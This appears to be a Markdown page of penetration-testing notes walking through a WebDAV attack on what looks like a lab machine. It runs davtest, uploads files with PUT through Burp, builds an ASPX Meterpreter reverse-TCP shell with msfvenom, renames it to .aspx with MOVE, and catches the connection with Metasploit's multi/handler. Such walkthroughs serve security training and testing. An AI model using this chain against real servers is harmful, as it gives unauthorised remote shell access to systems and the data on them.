# Webdav Testing

## Davtest

```
$davtest -url http://url-of-the-host
```

## Davtest through proxy

```
Open Burp
Setup new proxy listener
Set local listener port *(80) 
Set remote host (10.10.10.15)
Set remote port (80)
```

## Setting up proxy 

![Davtest-01](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-01.png)

## Confirming Webdav Manipulation

![Davtest-02](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-02.png)

## Davtest

![Davtest-03](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-03.png)

## Test upload using post

```
1) Send one of the PUT request to the repeater tab
2) Modify the URL to /test.html or whatever you like
3) In the body add some text and send the request (shold get 201)
```

![Davtest-04](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-04.png)

![Davtest-05](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-05.png)

## Create an Msfvenom Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.49 LPORT=443 -f aspx
```

## Upload Msfvenom Shell using PUT

```
1) Using the PUT request in repeater tab, modify the destination to /shell.html
2) In the body, take contents of the .ASPX Msfvenom shell and paste
3) Send the request (should get 201)
```

![Davtest-06](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-06.png)

## Setup Multihandler in Msfconsole to catch our Shell

```
1) Msfconsole
2) Use exploit/multi/handler
```

![Davtest-07](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-07.png)

## MOVING the .html to .aspx to complete the Reverse Shell

```
1) Back in the repeater tab Manipulate the HTTP Method from PUT to MOVE
1a) PUT /shell.html
2) Add a new line underneath PUT with:
2a) Destination: /shell.aspx
```

![Davtest-08](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-08.png)

## Browse to http://10.10.10.15/shell.aspx


![Davtest-09](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-09.png)